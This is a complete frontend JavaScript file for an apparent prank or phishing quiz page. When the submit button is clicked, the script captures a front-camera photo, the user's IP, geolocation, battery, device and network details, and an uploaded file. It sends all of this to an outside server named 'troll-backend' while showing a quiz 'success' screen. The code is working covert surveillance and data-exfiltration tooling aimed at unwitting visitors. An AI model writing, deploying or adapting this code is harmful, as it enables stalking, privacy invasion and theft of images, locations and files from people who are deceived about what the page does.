// ================================
// FRONTEND SCRIPT.JS
// ================================

const btn = document.getElementById('submit-btn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const fileInput = document.getElementById('user-file');

const BACKEND_BASE = "https://troll-backend.onrender.com/api";

// ================================
// GET DEVICE IP
// ================================
async function getIp() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip || "N/A";
  } catch {
    return "N/A";
  }
}

// ================================
// COLLECT METADATA
// ================================
async function collectMetadata() {
  const ip = await getIp();

  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery: "N/A",
    deviceMemory: navigator.deviceMemory || "N/A",
    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
    location: "N/A",
    ip: ip,
    time: new Date().toLocaleString()
  };

  // Battery info
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      metadata.battery = battery.level * 100 + "%, charging: " + battery.charging;
    } catch {}
  }

  // Location
  if (navigator.geolocation) {
    try {
      const pos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej)
      );
      metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
    } catch {}
  }

  return metadata;
}

// ================================
// CAPTURE CAMERA IMAGE
// ================================
async function captureCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
    video.srcObject = stream;

    await new Promise(r => setTimeout(r, 2500)); // wait for camera ready

    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const image = canvas.toDataURL('image/png');

    const metadata = await collectMetadata();

    await fetch(`${BACKEND_BASE}/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata })
    });

    stream.getTracks().forEach(t => t.stop());

  } catch (err) {
    console.error("Camera error:", err);
  }
}

// ================================
// SEND FILE
// ================================
async function sendFile(file) {
  if (!file) return;

  const reader = new FileReader();
  reader.onload = async () => {
    const base64 = reader.result;
    try {
      await fetch(`${BACKEND_BASE}/file-upload`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ fileData: base64, filename: file.name })
      });
    } catch (err) {
      console.error("File upload error:", err);
    }
  };
  reader.readAsDataURL(file);
}

// ================================
// SUBMIT BUTTON
// ================================
btn.addEventListener('click', async (e) => {
  e.preventDefault();

  // Capture camera if permission granted
  await captureCamera();

  // Wait a bit for user to select file
  if (!fileInput.files.length) {
    alert("Please select a file before submitting!");
    return;
  }

  await sendFile(fileInput.files[0]);

  // Show success
  document.getElementById('quiz-container').style.display = 'none';
  document.getElementById('success-container').style.display = 'flex';
});
